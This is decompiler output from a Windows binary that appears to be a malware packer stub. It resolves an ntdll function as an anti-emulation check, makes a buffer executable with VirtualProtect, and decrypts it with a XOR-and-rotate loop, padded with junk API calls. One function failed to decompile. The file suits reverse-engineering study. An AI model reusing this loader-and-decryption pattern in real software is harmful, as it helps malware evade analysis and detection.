/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int sub_401026(void); // weak
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall VirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// UINT __stdcall GetACP();
// DWORD __stdcall GetCurrentThreadId();
// DWORD __stdcall GetVersion();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// DWORD __stdcall GetFileType(HANDLE hFile);
// DWORD __stdcall GetCurrentProcessId();
// HANDLE __stdcall GetProcessHeap();
// DWORD __stdcall SizeofResource(HMODULE hModule, HRSRC hResInfo);
// LPSTR __stdcall GetCommandLineA();
int start();
int __stdcall sub_411188(_DWORD *a1, unsigned int a2, int a3);

//-------------------------------------------------------------------------
// Data declarations

int dword_401000[9] =
{
  1596026875,
  -998837389,
  804023951,
  1513730817,
  724947924,
  814525250,
  964225279,
  -1875158851,
  -719209023
}; // weak
_UNKNOWN loc_4110F5; // weak
CHAR ModuleName[] = "NTDLL.DLL"; // idb
CHAR ProcName[] = "ZwGetDevicePowerState"; // idb


//----- (00401026) --------------------------------------------------------
#error "401024: positive sp value has been found (funcsize=5)"

//----- (00411079) --------------------------------------------------------
int start()
{
  int v1; // [esp-4h] [ebp-24h]
  HMODULE hModule; // [esp+10h] [ebp-10h]
  DWORD flOldProtect; // [esp+14h] [ebp-Ch] BYREF
  int v4; // [esp+18h] [ebp-8h]
  HRSRC hResInfo; // [esp+1Ch] [ebp-4h]

  GetCurrentThreadId();
  hModule = GetModuleHandleA(ModuleName);
  GetCurrentProcessId();
  hResInfo = (HRSRC)GetProcAddress(hModule, ProcName);
  GetCurrentProcessId();
  GetProcessHeap();
  SizeofResource(0, (HRSRC)hModule);
  GetCommandLineA();
  v4 = ((int (__stdcall *)(_DWORD, _DWORD))hResInfo)(0, 0);
  ((void (*)(void))((char *)&loc_4110F5 + (v4 ^ 0xC0000005)))();
  SizeofResource(0, hResInfo);
  GetFileType(hResInfo);
  GetVersion();
  VirtualProtect(dword_401000, 0xFDA7u, 0x40u, &flOldProtect);
  v1 = v4;
  GetCurrentProcessId();
  GetACP();
  GetCommandLineA();
  ((int (__stdcall *)(int *, unsigned int, int))((char *)sub_411188 + v4 + 1073741819))(dword_401000, 64935u, v1);
  GetCommandLineA();
  GetACP();
  return sub_401026();
}
// 401000: using guessed type int dword_401000[9];
// 401026: using guessed type int sub_401026(void);

//----- (00411188) --------------------------------------------------------
int __stdcall sub_411188(_DWORD *a1, unsigned int a2, int a3)
{
  unsigned int v4; // ecx
  int result; // eax

  v4 = a2 >> 2;
  result = a3;
  do
  {
    *a1 ^= a3;
    *a1 = __ROR4__(*a1, 60);
    *a1 = __ROR4__(*a1, 24);
    *a1 ^= a3;
    *a1 ^= 0xFBC88043;
    *a1++ -= 77903072;
    --v4;
  }
  while ( v4 );
  return result;
}

// nfuncs=14 queued=3 decompiled=3 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 3 function(s)"
